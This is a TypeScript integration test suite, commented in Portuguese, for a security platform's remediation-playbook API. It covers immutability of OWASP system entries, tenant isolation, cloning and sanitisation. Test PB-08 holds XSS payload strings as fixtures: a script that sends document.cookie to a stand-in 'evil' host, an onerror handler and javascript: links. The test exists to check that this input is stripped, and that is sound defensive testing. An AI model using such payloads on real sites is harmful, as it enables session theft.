/**
 * remediation-playbook.test.ts (integration)
 *
 * Catálogo de remediação (CP-5 — docs/DECISIONS.md D5) contra a API e o banco
 * reais, com o CONTEÚDO OFICIAL da OWASP vindo do snapshot offline.
 *
 * Três coisas se provam aqui, e as três são de segurança antes de serem de
 * funcionalidade:
 *   1. o System é IMUTÁVEL e GLOBAL — ninguém edita, ninguém falsifica;
 *   2. o custom é do TENANT — a empresa B não vê nem toca o da empresa A;
 *   3. nada perigoso ENTRA no banco — a sanitização é na escrita, não só na tela.
 *
 *   PB-01      seed offline: dez categorias, System, com atribuição CC BY-SA
 *   PB-02      CRUD do custom pelo PENTESTER
 *   PB-03      System é imutável: PUT e DELETE dão 403 — inclusive para ADMIN
 *   PB-04      isSystem/companyId/source do corpo são IGNORADOS
 *   PB-05      CLIENT é read-only no catálogo
 *   PB-06      tenancy: custom de A é invisível e intocável para B
 *   PB-07      clone preserva conteúdo e procedência, e vira custom do tenant
 *   PB-08      XSS não entra no banco (script, handler, javascript:)
 *   PB-09      referência http/javascript é recusada; https entra
 *   PB-10      sync é idempotente: rodar de novo atualiza, não duplica
 *   PB-11      sync NUNCA sobrescreve custom, nem de mesma categoria e título
 *   PB-12      "Como corrigir": custom do tenant antes do System da OWASP
 *   PB-13      PENTESTER sem empresa não cria playbook invisível
 *   PB-SEED-01 todo playbook System tem remediação e ao menos uma referência
 *   TEN-33     canário de tenancy do catálogo
 */

import request from "supertest";
import { app } from "../../src/app";
import { cleanDatabase } from "../setup";
import { prisma } from "../../src/database/prisma.database";
import { seedUser } from "../fixtures/users.fixture";
import { seedPlan } from "../fixtures/plans.fixture";
import { seedCompany } from "../fixtures/companies.fixture";
import { seedSubscription } from "../fixtures/subscriptions.fixture";
import { seedApplication } from "../fixtures/applications.fixture";
import { seedProject, seedProjectMember } from "../fixtures/projects.fixture";
import { seedVulnerability } from "../fixtures/vulnerabilities.fixture";
import { loginAs } from "../fixtures/auth.fixture";
import { makeSyncServiceDeTeste, seedOwaspSystemPlaybooks } from "../fixtures/playbooks.fixture";
import { OWASP_LICENSE } from "../../src/utils/owasp-parser.util";

const PASSWORD = "senha12345";
const auth = (t: string) => ({ Authorization: `Bearer ${t}` });

type Cenario = {
  admin: string;
  pentesterA: string;
  pentesterB: string;
  pentesterBId: string;
  pentesterSemEmpresa: string;
  pentesterSemEmpresaId: string;
  clientA: string;
  companyAId: string;
  companyBId: string;
};

async function montarCenario(): Promise<Cenario> {
  const plan = await seedPlan({ name: "PRO", maxApplications: 10 });
  const companyA = await seedCompany({ name: "Empresa A", planId: plan.id });
  const companyB = await seedCompany({ name: "Empresa B", planId: plan.id });
  for (const c of [companyA, companyB]) {
    await seedSubscription({ companyId: c.id, planId: plan.id, status: "ACTIVE", startDate: new Date() });
  }

  const admin = await seedUser({ name: "Admin", email: "admin@v.local", password: PASSWORD, role: "ADMIN" });
  const pentesterA = await seedUser({
    name: "Pen A", email: "pen-a@v.local", password: PASSWORD, role: "PENTESTER", companyId: companyA.id,
  });
  const pentesterB = await seedUser({
    name: "Pen B", email: "pen-b@v.local", password: PASSWORD, role: "PENTESTER", companyId: companyB.id,
  });
  const pentesterSemEmpresa = await seedUser({
    name: "Pen Livre", email: "pen-livre@v.local", password: PASSWORD, role: "PENTESTER",
  });
  const clientA = await seedUser({
    name: "Client A", email: "client-a@v.local", password: PASSWORD, role: "CLIENT",
    companyId: companyA.id, companyRole: "OWNER",
  });

  return {
    admin: await loginAs(app, admin.email, PASSWORD),
    pentesterA: await loginAs(app, pentesterA.email, PASSWORD),
    pentesterB: await loginAs(app, pentesterB.email, PASSWORD),
    pentesterBId: pentesterB.id,
    pentesterSemEmpresa: await loginAs(app, pentesterSemEmpresa.email, PASSWORD),
    pentesterSemEmpresaId: pentesterSemEmpresa.id,
    clientA: await loginAs(app, clientA.email, PASSWORD),
    companyAId: companyA.id,
    companyBId: companyB.id,
  };
}

/** Cria um playbook custom pela API e devolve o corpo. */
async function criarCustom(token: string, body: Record<string, unknown>) {
  const res = await request(app).post("/api/playbooks").set(auth(token)).send(body);
  expect(res.status).toBe(201);
  return res.body;
}

describe("Remediation Playbooks (CP-5)", () => {
  let c: Cenario;

  beforeEach(async () => {
    await cleanDatabase();
    c = await montarCenario();
  });

  it("PB-01 o seed offline traz as dez categorias como System, com atribuição CC BY-SA", async () => {
    const resultado = await seedOwaspSystemPlaybooks();
    expect(resultado.created).toBe(10);
    expect(resultado.failed).toHaveLength(0);

    const res = await request(app).get("/api/playbooks").set(auth(c.pentesterA));
    expect(res.status).toBe(200);
    expect(res.body).toHaveLength(10);
    for (const p of res.body) {
      expect(p.isSystem).toBe(true);
      // A invariante do modelo: System <=> sem dono.
      expect(p.companyId).toBeNull();
      expect(p.source).toBe("OWASP_TOP10");
    }

    // A atribuição da licença tem de chegar à tela, não ficar só no banco.
    const detalhe = await request(app).get(`/api/playbooks/${res.body[0].id}`).set(auth(c.pentesterA));
    expect(detalhe.status).toBe(200);
    expect(detalhe.body.provenance.attribution).toBe("OWASP Foundation");
    expect(detalhe.body.provenance.license).toBe(OWASP_LICENSE);
    expect(detalhe.body.provenance.sourceUrl).toContain("owasp.org");
    expect(detalhe.body.provenance.sourceVersion).toBe("2021@test");
  });

  it("PB-02 PENTESTER cria, lê, atualiza e remove um playbook da própria empresa", async () => {
    const criado = await criarCustom(c.pentesterA, {
      title: "Injeção SQL no gateway de pagamentos",
      owaspCategory: "A03",
      summary: "Como tratamos injeção no nosso gateway.",
      remediation: "Usar **consultas parametrizadas** no driver do gateway.",
      cweIds: ["CWE-89", "89", "invalido"],
      references: [{ title: "ASVS", url: "https://owasp.org/asvs" }],
    });

    expect(criado.isSystem).toBe(false);
    expect(criado.companyId).toBe(c.companyAId);
    expect(criado.provenance.source).toBe("CUSTOM");
    // Custom escrito do zero NÃO credita a OWASP — seria atribuição falsa.
    expect(criado.provenance.attribution).toBeNull();
    // "CWE-89" e "89" são o mesmo; "invalido" cai fora.
    expect(criado.cweIds).toEqual(["89", "89"]);

    const atualizado = await request(app)
      .put(`/api/playbooks/${criado.id}`)
      .set(auth(c.pentesterA))
      .send({ title: "Injeção SQL no gateway (v2)", validationSteps: "Repetir o teste com sqlmap." });
    expect(atualizado.status).toBe(200);
    expect(atualizado.body.title).toBe("Injeção SQL no gateway (v2)");
    expect(atualizado.body.validationSteps).toContain("sqlmap");
    expect(atualizado.body.remediation).toContain("consultas parametrizadas");

    const removido = await request(app).delete(`/api/playbooks/${criado.id}`).set(auth(c.pentesterA));
    expect(removido.status).toBe(204);
    const depois = await request(app).get(`/api/playbooks/${criado.id}`).set(auth(c.pentesterA));
    expect(depois.status).toBe(404);
  });

  it("PB-03 playbook System é imutável — nem o ADMIN edita ou remove", async () => {
    await seedOwaspSystemPlaybooks();
    const system = await prisma.remediationPlaybook.findFirstOrThrow({ where: { isSystem: true } });

    for (const token of [c.admin, c.pentesterA]) {
      const put = await request(app).put(`/api/playbooks/${system.id}`).set(auth(token)).send({ title: "Sequestrado" });
      expect(put.status).toBe(403);
      expect(put.body.error).toBe("CANNOT_EDIT_SYSTEM_PLAYBOOK");

      const del = await request(app).delete(`/api/playbooks/${system.id}`).set(auth(token));
      expect(del.status).toBe(403);
    }

    const intacto = await prisma.remediationPlaybook.findUniqueOrThrow({ where: { id: system.id } });
    expect(intacto.title).toBe(system.title);
  });

  it("PB-04 isSystem, companyId e source vindos do corpo são ignorados", async () => {
    // Este é o ataque que a separação de origem existe para impedir: publicar
    // um "playbook oficial da OWASP" falso, visível para TODAS as empresas.
    const criado = await criarCustom(c.pentesterA, {
      title: "Playbook forjado",
      isSystem: true,
      companyId: c.companyBId,
      source: "OWASP_TOP10",
      sourceUrl: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
      sourceKey: "A01_2021",
      createdBy: "outra-pessoa",
    });

    expect(criado.isSystem).toBe(false);
    expect(criado.companyId).toBe(c.companyAId);
    expect(criado.provenance.source).toBe("CUSTOM");
    expect(criado.provenance.sourceUrl).toBeNull();
    // Sem sourceUrl da OWASP não há atribuição — o forjado não se passa por oficial.
    expect(criado.provenance.attribution).toBeNull();

    const persistido = await prisma.remediationPlaybook.findUniqueOrThrow({ where: { id: criado.id } });
    expect(persistido.isSystem).toBe(false);
    expect(persistido.sourceKey).toBeNull();
    expect(persistido.companyId).toBe(c.companyAId);
  });

  it("PB-05 CLIENT lê o catálogo mas não escreve nele", async () => {
    await seedOwaspSystemPlaybooks();

    const leitura = await request(app).get("/api/playbooks").set(auth(c.clientA));
    expect(leitura.status).toBe(200);
    expect(leitura.body.length).toBe(10);

    const post = await request(app).post("/api/playbooks").set(auth(c.clientA)).send({ title: "Meu playbook" });
    expect(post.status).toBe(403);

    const custom = await criarCustom(c.pentesterA, { title: "Da casa", owaspCategory: "A01" });
    const put = await request(app).put(`/api/playbooks/${custom.id}`).set(auth(c.clientA)).send({ title: "x" });
    expect(put.status).toBe(403);
    const del = await request(app).delete(`/api/playbooks/${custom.id}`).set(auth(c.clientA));
    expect(del.status).toBe(403);

    // Mas o CLIENT da MESMA empresa continua LENDO o custom da casa.
    const detalhe = await request(app).get(`/api/playbooks/${custom.id}`).set(auth(c.clientA));
    expect(detalhe.status).toBe(200);
  });

  it("PB-06 custom da empresa A é invisível e intocável para a empresa B", async () => {
    await seedOwaspSystemPlaybooks();
    const daA = await criarCustom(c.pentesterA, { title: "Segredo da A", owaspCategory: "A01" });

    const listaB = await request(app).get("/api/playbooks").set(auth(c.pentesterB));
    expect(listaB.status).toBe(200);
    expect(listaB.body.map((p: { id: string }) => p.id)).not.toContain(daA.id);
    // B vê o System (global) e nada de custom alheio.
    expect(listaB.body).toHaveLength(10);

    expect((await request(app).get(`/api/playbooks/${daA.id}`).set(auth(c.pentesterB))).status).toBe(403);
    expect((await request(app).put(`/api/playbooks/${daA.id}`).set(auth(c.pentesterB)).send({ title: "x" })).status).toBe(403);
    expect((await request(app).delete(`/api/playbooks/${daA.id}`).set(auth(c.pentesterB))).status).toBe(403);

    // E o registro continua lá, com o dono original.
    const intacto = await prisma.remediationPlaybook.findUniqueOrThrow({ where: { id: daA.id } });
    expect(intacto.companyId).toBe(c.companyAId);
    expect(intacto.title).toBe("Segredo da A");
  });

  it("PB-07 clone copia o conteúdo, vira custom do tenant e preserva a procedência", async () => {
    await seedOwaspSystemPlaybooks();
    const origem = await prisma.remediationPlaybook.findFirstOrThrow({ where: { sourceKey: "A03_2021" } });

    const res = await request(app)
      .post(`/api/playbooks/${origem.id}/clone`)
      .set(auth(c.pentesterA))
      .send({ title: "A03 adaptado ao nosso stack" });
    expect(res.status).toBe(201);

    const clone = res.body;
    expect(clone.isSystem).toBe(false);
    expect(clone.companyId).toBe(c.companyAId);
    expect(clone.provenance.source).toBe("CUSTOM");
    expect(clone.provenance.clonedFromId).toBe(origem.id);
    // Cópia PROFUNDA: o texto veio junto, não uma referência ao original.
    expect(clone.remediation).toBe(origem.remediation);
    expect(clone.rootCause).toBe(origem.rootCause);
    expect(clone.owaspCategory).toBe("A03");
    // Obra derivada de conteúdo CC BY-SA continua creditando a OWASP.
    expect(clone.provenance.attribution).toBe("OWASP Foundation");
    expect(clone.provenance.license).toBe(OWASP_LICENSE);
    // sourceKey zerado: só o sync usa essa chave, e ela é unique com source.
    const persistido = await prisma.remediationPlaybook.findUniqueOrThrow({ where: { id: clone.id } });
    expect(persistido.sourceKey).toBeNull();

    // Editar o clone NÃO mexe no original.
    await request(app).put(`/api/playbooks/${clone.id}`).set(auth(c.pentesterA)).send({ remediation: "Nosso jeito." });
    const originalDepois = await prisma.remediationPlaybook.findUniqueOrThrow({ where: { id: origem.id } });
    expect(originalDepois.remediation).toBe(origem.remediation);
  });

  it("PB-08 conteúdo perigoso não chega ao banco", async () => {
    const criado = await criarCustom(c.pentesterA, {
      title: "Playbook com payload",
      owaspCategory: "A03",
      summary: "<script>fetch('https://evil/'+document.cookie)</script>Resumo legítimo.",
      rootCause: '<img src="x" onerror="alert(1)">Causa raiz.',
      remediation: "Veja [aqui](javascript:alert(1)) e [ali](https://owasp.org/ok).",
      secureExample: "```js\nconst q = `SELECT 1`; // <script>não é payload aqui</script>\n```",
    });

    const persistido = await prisma.remediationPlaybook.findUniqueOrThrow({ where: { id: criado.id } });
    expect(persistido.summary).not.toMatch(/<script/i);
    expect(persistido.summary).not.toContain("document.cookie");
    expect(persistido.summary).toContain("Resumo legítimo.");
    expect(persistido.rootCause!.toLowerCase()).not.toMatch(/\son[a-z]+\s*=/);
    expect(persistido.remediation).not.toMatch(/javascript:/i);
    expect(persistido.remediation).toContain("https://owasp.org/ok");
    // O bloco de código é preservado: um playbook precisa poder MOSTRAR o ataque.
    expect(persistido.secureExample).toContain("<script>não é payload aqui</script>");
  });

  it("PB-09 referência insegura é recusada; https entra", async () => {
    const base = { title: "Com referências", owaspCategory: "A01" };

    for (const url of ["http://owasp.org/x", "javascript:alert(1)", "data:text/html,x", "/relativo"]) {
      const res = await request(app)
        .post("/api/playbooks")
        .set(auth(c.pentesterA))
        .send({ ...base, references: [{ title: "r", url }] });
      expect(res.status).toBe(400);
      expect(res.body.error).toBe("INVALID_REFERENCES");
    }

    const ok = await criarCustom(c.pentesterA, {
      ...base,
      references: [{ title: "Cheat Sheet", url: "https://cheatsheetseries.owasp.org/x.html" }],
    });
    expect(ok.references).toEqual([{ title: "Cheat Sheet", url: "https://cheatsheetseries.owasp.org/x.html" }]);
  });

  it("PB-10 sync é idempotente: a segunda passada atualiza e não duplica", async () => {
    const primeira = await seedOwaspSystemPlaybooks("2021@v1");
    expect(primeira.created).toBe(10);

    const segunda = await seedOwaspSystemPlaybooks("2021@v2");
    expect(segunda.created).toBe(0);
    expect(segunda.updated).toBe(10);
    expect(segunda.failed).toHaveLength(0);

    expect(await prisma.remediationPlaybook.count({ where: { isSystem: true } })).toBe(10);
    // A versão da fonte acompanha a última importação — é o que torna uma
    // mudança inesperada no conteúdo oficial detectável.
    const qualquer = await prisma.remediationPlaybook.findFirstOrThrow({ where: { isSystem: true } });
    expect(qualquer.sourceVersion).toBe("2021@v2");
  });

  it("PB-11 sync não sobrescreve custom, nem de mesma categoria e mesmo título", async () => {
    await seedOwaspSystemPlaybooks();
    const oficial = await prisma.remediationPlaybook.findFirstOrThrow({ where: { sourceKey: "A03_2021" } });

    // Um custom deliberadamente "parecido" com o oficial — mesma categoria,
    // mesmo título. Se o sync casasse por título ou categoria em vez de
    // [source, sourceKey], ele apagaria o trabalho do tenant.
    const custom = await criarCustom(c.pentesterA, {
      title: oficial.title,
      owaspCategory: "A03",
      remediation: "Instrução interna que não pode ser perdida.",
    });

    const resultado = await makeSyncServiceDeTeste().sync({
      buscar: (await import("../fixtures/playbooks.fixture")).lerDoSnapshot,
      sourceVersion: "2021@v3",
    });
    expect(resultado.failed).toHaveLength(0);

    const depois = await prisma.remediationPlaybook.findUniqueOrThrow({ where: { id: custom.id } });
    expect(depois.remediation).toBe("Instrução interna que não pode ser perdida.");
    expect(depois.isSystem).toBe(false);
    expect(depois.companyId).toBe(c.companyAId);
    expect(await prisma.remediationPlaybook.count()).toBe(11); // 10 System + 1 custom
  });

  it("PB-12 'Como corrigir' devolve o custom do tenant antes do System da OWASP", async () => {
    await seedOwaspSystemPlaybooks();
    const custom = await criarCustom(c.pentesterA, {
      title: "Injeção — jeito da casa",
      owaspCategory: "A03",
      remediation: "Nosso passo a passo.",
    });

    const res = await request(app)
      .get(`/api/playbooks/for-category/A03?companyId=${c.companyAId}`)
      .set(auth(c.pentesterA));
    expect(res.status).toBe(200);
    expect(res.body.length).toBe(2);
    expect(res.body[0].id).toBe(custom.id); // custom primeiro
    expect(res.body[1].isSystem).toBe(true); // System depois

    // A empresa B, na mesma categoria, só enxerga o oficial.
    const resB = await request(app)
      .get(`/api/playbooks/for-category/A03?companyId=${c.companyBId}`)
      .set(auth(c.pentesterB));
    expect(resB.status).toBe(200);
    expect(resB.body).toHaveLength(1);
    expect(resB.body[0].isSystem).toBe(true);
  });

  it("PB-13 PENTESTER sem empresa não cria playbook que ninguém veria", async () => {
    const res = await request(app)
      .post("/api/playbooks")
      .set(auth(c.pentesterSemEmpresa))
      .send({ title: "Órfão", owaspCategory: "A01" });
    expect(res.status).toBe(422);
    expect(res.body.error).toBe("USER_HAS_NO_COMPANY");
    expect(await prisma.remediationPlaybook.count({ where: { isSystem: false } })).toBe(0);
  });

  it("PB-14 PENTESTER sem companyId herda o escopo do projeto no catálogo e no finding", async () => {
    const appA = await seedApplication({ name: "Aplicação A", companyId: c.companyAId });
    const appB = await seedApplication({ name: "Aplicação B", companyId: c.companyBId });
    const projectA = await seedProject({ name: "Projeto A", applicationId: appA.id, companyId: c.companyAId });
    const projectB = await seedProject({ name: "Projeto B", applicationId: appB.id, companyId: c.companyBId });
    await seedProjectMember(projectA.id, c.pentesterSemEmpresaId);

    const findingA = await seedVulnerability({
      projectId: projectA.id,
      applicationId: appA.id,
      companyId: c.companyAId,
      createdBy: c.pentesterSemEmpresaId,
      title: "Finding A",
      owaspCategory: "A03",
    });
    await seedVulnerability({
      projectId: projectB.id,
      applicationId: appB.id,
      companyId: c.companyBId,
      createdBy: c.pentesterBId,
      title: "Finding B",
      owaspCategory: "A03",
    });

    const customA = await criarCustom(c.pentesterA, { title: "Playbook privado A", owaspCategory: "A03" });
    const customB = await criarCustom(c.pentesterB, { title: "Playbook privado B", owaspCategory: "A03" });

    const catalogo = await request(app)
      .get("/api/playbooks?source=CUSTOM")
      .set(auth(c.pentesterSemEmpresa));
    expect(catalogo.status).toBe(200);
    expect(catalogo.body.map((p: { id: string }) => p.id)).toEqual([customA.id]);
    expect(catalogo.body.map((p: { id: string }) => p.id)).not.toContain(customB.id);

    // Este é o contrato consumido pelo HowToFixPanel do finding: o companyId
    // vem do finding, enquanto o escopo efetivo vem do vínculo do projeto.
    const comoCorrigirA = await request(app)
      .get(`/api/playbooks/for-category/${findingA.owaspCategory}?companyId=${findingA.companyId}`)
      .set(auth(c.pentesterSemEmpresa));
    expect(comoCorrigirA.status).toBe(200);
    expect(comoCorrigirA.body.map((p: { id: string }) => p.id)).toContain(customA.id);
    expect(comoCorrigirA.body.map((p: { id: string }) => p.id)).not.toContain(customB.id);

    const comoCorrigirB = await request(app)
      .get(`/api/playbooks/for-category/A03?companyId=${c.companyBId}`)
      .set(auth(c.pentesterSemEmpresa));
    expect(comoCorrigirB.status).toBe(200);
    expect(comoCorrigirB.body.map((p: { id: string }) => p.id)).not.toContain(customB.id);
  });

  it("PB-SEED-01 todo playbook System tem remediação e ao menos uma referência", async () => {
    await seedOwaspSystemPlaybooks();
    const todos = await prisma.remediationPlaybook.findMany({ where: { isSystem: true } });
    expect(todos).toHaveLength(10);

    for (const p of todos) {
      expect(p.owaspCategory).toMatch(/^A(0[1-9]|10)$/);
      expect(p.title).not.toContain("![");
      expect(p.rootCause!.length).toBeGreaterThan(100);
      expect(p.remediation!.length).toBeGreaterThan(100);

      // ⚠️ O A06 pt-BR lista referências SEM link; quem cobre o buraco são as
      // Cheat Sheets do IndexTopTen. Por isso a garantia é "ao menos uma
      // referência clicável", somando as duas fontes oficiais.
      const refs = JSON.parse(p.references ?? "[]") as Array<{ url: string }>;
      expect(refs.length).toBeGreaterThan(0);
      for (const r of refs) expect(r.url.startsWith("https://")).toBe(true);

      expect(JSON.parse(p.cweIds ?? "[]").length).toBeGreaterThan(0);
      // Nenhum conteúdo perigoso sobreviveu à importação.
      expect(p.remediation).not.toMatch(/<script/i);
    }
  });

  it("TEN-33 canário de tenancy: nenhuma rota do catálogo vaza custom entre empresas", async () => {
    await seedOwaspSystemPlaybooks();
    const daA = await criarCustom(c.pentesterA, { title: "Só da A", owaspCategory: "A05" });
    const daB = await criarCustom(c.pentesterB, { title: "Só da B", owaspCategory: "A05" });

    const idsDe = async (token: string): Promise<string[]> => {
      const lista = await request(app).get("/api/playbooks?source=CUSTOM").set(auth(token));
      expect(lista.status).toBe(200);
      return lista.body.map((p: { id: string }) => p.id);
    };

    expect(await idsDe(c.pentesterA)).toEqual([daA.id]);
    expect(await idsDe(c.pentesterB)).toEqual([daB.id]);

    // A busca por categoria é outra porta para a mesma tabela — tem de fechar igual.
    const porCategoria = await request(app)
      .get(`/api/playbooks/for-category/A05?companyId=${c.companyAId}`)
      .set(auth(c.pentesterB));
    // B pede o custom de A: recebe apenas o que o PRÓPRIO escopo permite.
    expect(porCategoria.status).toBe(200);
    expect(porCategoria.body.map((p: { id: string }) => p.id)).not.toContain(daA.id);

    // O ADMIN, esse sim, enxerga o custom das duas.
    const adminLista = await request(app).get("/api/playbooks?source=CUSTOM").set(auth(c.admin));
    expect(adminLista.body.map((p: { id: string }) => p.id).sort()).toEqual([daA.id, daB.id].sort());
  });
});
